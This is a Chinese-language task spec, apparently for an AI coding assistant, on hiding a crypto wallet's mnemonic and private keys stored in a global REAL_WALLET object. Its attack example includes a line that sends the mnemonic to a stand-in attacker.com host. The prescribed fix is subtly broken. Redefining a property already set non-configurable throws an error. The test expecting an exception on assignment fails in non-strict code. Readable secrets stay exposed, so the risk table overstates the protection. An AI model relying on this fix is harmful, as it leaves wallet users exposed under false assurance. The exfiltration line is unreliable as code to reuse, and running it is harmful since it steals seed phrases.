# 🔒 CURSOR TASK P0-2：防止 REAL_WALLET 半初始化暴露

## 【项目】
WorldWallet / wallet-shell

## 【文件】
`wallet-shell/wallet.core.js` (Lines 103-111, 240-241, 277-278)

## 【问题】

### 核心风险：半初始化状态暴露

**当前代码** (Line 240-241):
```javascript
async function createRealWallet(forcedWordCount) {
  // ... 各种初始化步骤 ...
  
  const w = {
    mnemonic: mnemonic,
    enMnemonic: mnemonic,
    words: mnemonic.split(' '),
    ethAddress: wallet.address,
    trxAddress: trxAddr,
    btcAddress: btcWallet.address,
    privateKey: wallet.privateKey,
    trxPrivateKey: trxWallet.privateKey,
    createdAt: Date.now()
  };
  
  window.REAL_WALLET = w;  // ❌ 问题 1：全局赋值
  REAL_WALLET = w;         // ❌ 问题 2：局部赋值
  CHAIN_ADDR = w.trxAddress || '--';
  
  saveWallet(w);           // 异步操作！
  applyReferralCredit();
  // ...
}
```

### 3 个具体风险

#### 风险 1️⃣：window.REAL_WALLET 在 saveWallet() 异步完成前就暴露了
- 时间线：
  1. `window.REAL_WALLET = w` (立即赋值) ← **❌ 钱包对象暴露**
  2. `saveWallet(w)` (异步)
  3. 存储完成 (可能 0-100ms 后)

- 攻击场景：
  ```javascript
  // 恶意脚本可以在存储完成前读取：
  setInterval(() => {
    if (window.REAL_WALLET && window.REAL_WALLET.mnemonic) {
      // ❌ 窃取助记词
      fetch('https://attacker.com/log?mnemonic=' + window.REAL_WALLET.mnemonic);
    }
  }, 10);  // 每 10ms 检查一次
  ```

#### 风险 2️⃣：可被外部脚本覆盖
- 无防护，任何脚本都可改：
  ```javascript
  window.REAL_WALLET = null;  // 清除
  window.REAL_WALLET = {...fake...};  // 替换
  ```

#### 风险 3️⃣：loadWalletPublic() / restoreWallet() 也有同样问题
- Line 103-111: `window.REAL_WALLET = {...}` 直接赋值
- Line 277-278: `REAL_WALLET = pub; window.REAL_WALLET = pub;` 顺序不当

---

## 【修改要求】

### 方案：原子赋值 + 防覆盖

#### 1️⃣ 创建完整对象后再赋值

```javascript
async function createRealWallet(forcedWordCount) {
  // ... 所有创建逻辑 ...
  
  const w = {
    mnemonic: mnemonic,
    // ... 所有字段 ...
  };
  
  // 异步操作先做
  await saveWallet(w);
  applyReferralCredit();
  
  // 所有操作完成后，再原子赋值
  Object.defineProperty(window, 'REAL_WALLET', {
    value: w,
    writable: false,      // 防止覆盖
    configurable: false   // 防止删除或重新定义
  });
  REAL_WALLET = w;
  CHAIN_ADDR = w.trxAddress || '--';
  
  // UI 更新
  try { if (typeof ensureNativeAddrInitialized === 'function') ... }
  
  return w;
}
```

#### 2️⃣ restoreWallet() 同样修改

```javascript
async function restoreWallet(mnemonic) {
  // ... 验证和导入逻辑 ...
  
  var pub = {
    ethAddress: result.eth.address,
    // ... 其他公开字段 ...
  };
  
  // 先保存到存储（异步完成）
  if (pin) {
    await saveWalletSecure(flatForStore, pin);
  } else {
    _saveWalletPlainPublicOnly({...});
  }
  
  // 再原子赋值
  Object.defineProperty(window, 'REAL_WALLET', {
    value: pub,
    writable: false,
    configurable: false
  });
  REAL_WALLET = pub;
  CHAIN_ADDR = (pub && pub.trxAddress) ? pub.trxAddress : '--';
  
  // 其他更新
  try { applyReferralCredit(); } ...
  
  return pub;
}
```

#### 3️⃣ loadWalletPublic() 也需要保护

```javascript
function loadWalletPublic() {
  try {
    var d = Store.getWallet();
    if (!d || !d.ethAddress) return null;
    
    var wallet_obj = {
      ethAddress: d.ethAddress,
      // ... 其他字段 ...
    };
    
    // 原子赋值 + 防覆盖
    Object.defineProperty(window, 'REAL_WALLET', {
      value: wallet_obj,
      writable: false,
      configurable: false
    });
    REAL_WALLET = window.REAL_WALLET;
    CHAIN_ADDR = (REAL_WALLET && REAL_WALLET.trxAddress) ? REAL_WALLET.trxAddress : '--';
    
    return wallet_obj;
  } catch (e) {
    console.error('[loadWalletPublic] error:', e);
    return null;
  }
}
```

#### 4️⃣ markBackupDone() 的赋值也要保护

```javascript
function markBackupDone() {
  const w = JSON.parse(localStorage.getItem('ww_wallet')||'{}');
  w.backedUp = true;
  localStorage.setItem('ww_wallet', JSON.stringify(w));
  
  // 更新内存中的 REAL_WALLET
  if(REAL_WALLET) {
    // ❌ 不能直接改 REAL_WALLET.backedUp（因为 writable:false）
    // ✅ 应该重新赋值整个对象
    var updated = Object.assign({}, REAL_WALLET, { backedUp: true });
    Object.defineProperty(window, 'REAL_WALLET', {
      value: updated,
      writable: false,
      configurable: false
    });
    REAL_WALLET = updated;
  }
  
  // ... 其他逻辑 ...
}
```

---

## 【限制】

- ✅ 不改变 REAL_WALLET 的属性结构
- ✅ 不改变 saveWallet() / restoreWallet() 返回值
- ✅ 不改变 UI 行为
- ❌ 不能直接修改 REAL_WALLET 属性（因为 writable:false）
  - 需要改造：`REAL_WALLET.backedUp = true` → 重新赋值整个对象
- ❌ 不能删除或重新定义 window.REAL_WALLET

---

## 【验收标准】

### 代码检查

```javascript
// 1. 无直接赋值暴露的时间窗口
// ✅ 所有初始化 → 存储完成 → 再赋值 window.REAL_WALLET

// 2. window.REAL_WALLET 被保护
// ✅ writable: false (防止覆盖)
// ✅ configurable: false (防止删除)

// 3. 所有更新 REAL_WALLET 的地方都用 Object.defineProperty
// ✅ createRealWallet()
// ✅ restoreWallet()
// ✅ loadWalletPublic()
// ✅ markBackupDone()
```

### 功能测试

```javascript
// 在 DevTools 中运行

// 1. 创建钱包后，REAL_WALLET 被保护
var ok1 = (function() {
  try {
    window.REAL_WALLET = null;
    return false;  // 不应该到这里
  } catch (e) {
    return true;  // 正确：无法覆盖
  }
})();
console.log('✅ REAL_WALLET 被保护:', ok1);

// 2. 删除 REAL_WALLET 失败
var ok2 = (function() {
  try {
    delete window.REAL_WALLET;
    return false;
  } catch (e) {
    return true;
  }
})();
console.log('✅ REAL_WALLET 无法删除:', ok2);

// 3. 读取 REAL_WALLET 正常
console.log('✅ REAL_WALLET 可读:', typeof window.REAL_WALLET === 'object');

// 4. 创建钱包流程正常
// - 创建 → 检查地址已显示 ✅
// - 导入钱包 → 检查地址已显示 ✅
// - 标记备份 → 检查 backedUp 已更新 ✅

// 5. 没有"Cannot assign to read only property"错误
// - markBackupDone() 应该正常完成
```

---

## 【关键要点】

### ⚠️ 陷阱 1：顺序很重要

```javascript
// ❌ 错误顺序
window.REAL_WALLET = w;  // 立即暴露
await saveWallet(w);     // 稍后保存（有窗口）

// ✅ 正确顺序
await saveWallet(w);     // 先完成存储
Object.defineProperty(window, 'REAL_WALLET', {...});  // 再赋值 + 保护
```

### ⚠️ 陷阱 2：需要区分"赋值"和"读取"

```javascript
// ❌ 错误：以下都无法工作
REAL_WALLET.backedUp = true;           // 无法赋值（writable:false）
delete REAL_WALLET.backedUp;           // 无法删除
window.REAL_WALLET = {...new...};      // 无法覆盖

// ✅ 正确：重新赋值整个对象
var updated = Object.assign({}, REAL_WALLET, { backedUp: true });
Object.defineProperty(window, 'REAL_WALLET', {
  value: updated,
  writable: false,
  configurable: false
});
```

### ⚠️ 陷阱 3：localStorage 更新后也要更新内存

```javascript
// markBackupDone 中
localStorage.setItem('ww_wallet', JSON.stringify({...backedUp: true...}));

// 必须同时更新内存中的 REAL_WALLET
// 不能只改 REAL_WALLET.backedUp（writable:false）
// 必须重新赋值整个对象
```

---

## 📊 风险评估

| 风险 | 修复前 | 修复后 |
|------|--------|--------|
| 时间窗口暴露 | 🔴 高 | 🟢 低（立即保护） |
| 被外部覆盖 | 🔴 高 | 🟢 低（configurable:false） |
| 被删除 | 🔴 高 | 🟢 低（configurable:false） |
| 部分更新问题 | 🟡 中 | 🟢 低（重新赋值） |

---

## ✅ 完成检查

- [ ] Object.defineProperty 用于所有 window.REAL_WALLET 赋值
- [ ] writable 和 configurable 都设为 false
- [ ] 存储操作完成后再赋值
- [ ] markBackupDone() 和其他更新都重新赋值整个对象
- [ ] 所有四个函数都被保护
- [ ] 功能测试通过

---

**优先级**: 🔴 CRITICAL  
**预计工时**: 45 分钟  
**风险**: 低（纯逻辑调整，无新依赖）
